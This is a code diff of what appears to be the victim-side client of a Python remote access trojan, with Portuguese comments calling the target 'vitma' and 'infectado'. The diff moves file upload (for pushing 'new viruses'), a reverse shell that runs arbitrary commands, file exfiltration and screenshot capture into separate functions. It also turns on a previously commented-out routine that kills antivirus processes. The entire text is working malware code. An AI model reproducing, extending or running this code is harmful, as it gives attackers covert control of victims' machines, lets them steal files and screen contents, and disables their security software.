@@ -24,9 +24,78 @@ TEMPDIR = tempfile.gettempdir() # diretório temporario do windows, onde será s
                         work with Remote Desktop.
 
 
-    Mkdir touch >
-    Print stderr + stdout no lado do cliente para que no lado do servidor não trave .
 '''
+
+def screenshot(s):
+    img = pyscreenshot.grab()
+    nome = TEMPDIR + '/screenshot'+str(random.randint(0,1000000)) + '.png'
+    img.save(nome)
+    f = open(nome ,'rb')
+    l = f.read(1024)
+    while(l):
+        socket.send(l)
+        l = f.read(1024)
+    f.close()
+    print('enviado')
+    os.remove(nome)
+
+def upload(s):
+    l = s.recv(1024)
+    nome_arquivo = l.split('+/-')[0]
+    print(nome_arquivo)
+    f = open(nome_arquivo,'wb')
+    l = l.split('+/-')[1]
+    j = s.recv(1024)
+    l = l + j
+    while (l):
+        f.write(l)
+        l = s.recv(1024)
+    f.close()
+
+def shell(s):
+    while True:
+        dados = s.recv(1024)
+        if(not dados or dados=='exit'):
+            break
+        if(dados == 'shell'):
+            pass
+        else:
+            if(dados.split(' ')[0] == 'cd'): # trocar de diretorio
+                try:
+                    pasta = (dados.split(' ')[1])
+                    if(os.path.isdir(pasta)):
+                        caminho = os.chdir(pasta.rstrip('\n'))
+                        local = os.getcwd()
+                        s.send(local)
+                    else:
+                        s.send('caminho não existe\n'+ os.getcwd())
+                except Exception as e:
+                    s.send('Error -> '+ e)
+            else: # executa o comando
+                comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
+                retorno = comando.stdout.read() + comando.stderr.read()
+                if(retorno == ''):
+                    s.send('feito')
+                else:
+                    s.send(retorno)
+
+def download(s):
+    arquivo = s.recv(1024)
+    print(arquivo)
+    if(os.path.isfile(arquivo)):
+        s.send('True')
+        f = open(arquivo, 'rb')
+        l = f.read(1024)
+        while(l):
+            s.send(l)
+            l = f.read(1024)
+        f.close()
+        print('envio completo')
+        s.shutdown(s.SHUT_WR)
+
+    else:
+        s.send('False')
+
 
 # finaliza o processo do antivirus rodando na maquina
 def kill_antivirus():
@@ -78,76 +147,15 @@ def executa(socket):
             else:
                 try:
                     if(dados=='1'): # servidor envia arquivos para a vitma -> envio de novos virus
-                        l = socket.recv(1024)
-                        nome_arquivo = l.split('+/-')[0]
-                        print(nome_arquivo)
-                        f = open(nome_arquivo,'wb')
-                        l = l.split('+/-')[1]
-                        j = socket.recv(1024)
-                        l = l + j
-                        while (l):
-                            f.write(l)
-                            l = socket.recv(1024)
-                        f.close()
-
+                        upload(socket)
                     elif(dados=='2'): # shell reversa -> servidor se conecta a maquina do infectado
-                        while True:
-                            dados = socket.recv(1024)
-                            if(not dados or dados=='exit'):
-                                break
-                            if(dados == 'shell'):
-                                pass
-                            else:
-                                if(dados.split(' ')[0] == 'cd'): # trocar de diretorio
-                                    try:
-                                        pasta = (dados.split(' ')[1])
-                                        if(os.path.isdir(pasta)):
-                                            caminho = os.chdir(pasta.rstrip('\n'))
-                                            local = os.getcwd()
-                                            socket.send(local)
-                                        else:
-                                            socket.send('caminho não existe\n'+ os.getcwd())
-                                    except Exception as e:
-                                        socket.send('Error -> '+ e)
-                                else: # executa o comando
-                                    comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
-                                    retorno = comando.stdout.read() + comando.stderr.read()
-                                    if(retorno == ''):
-                                        socket.send('feito')
-                                    else:
-                                        socket.send(retorno)
-
+                        shell(socket)
                     elif(dados=='3'): # Download
-                        arquivo = socket.recv(1024)
-                        if(os.path.isfile(arquivo)):
-                            socket.send('True')
-                            f = open(arquivo, 'rb')
-                            l = f.read(1024)
-                            while(l):
-                                socket.send(l)
-                                l = f.read(1024)
-                            f.close()
-                            print('envio completo')
-                            socket.shutdown(socket.SHUT_WR)
-
-                        else:
-                            socket.send('False')
-
+                        download(socket)
                     elif(dados == '4'): # Killav
-                        #kill_antivirus()
-                        pass
+                        kill_antivirus()
                     elif(dados == '5'): # screenshot
-                        img = pyscreenshot.grab()
-                        nome = TEMPDIR + '/screenshot'+str(random.randint(0,1000000)) + '.png'
-                        img.save(nome)
-                        f = open(nome ,'rb')
-                        l = f.read(1024)
-                        while(l):
-                            socket.send(l)
-                            l = f.read(1024)
-                        f.close()
-                        print('enviado')
-                        os.remove(nome)
+                        screenshot(socket)
                     else:
                         print(dados)
 
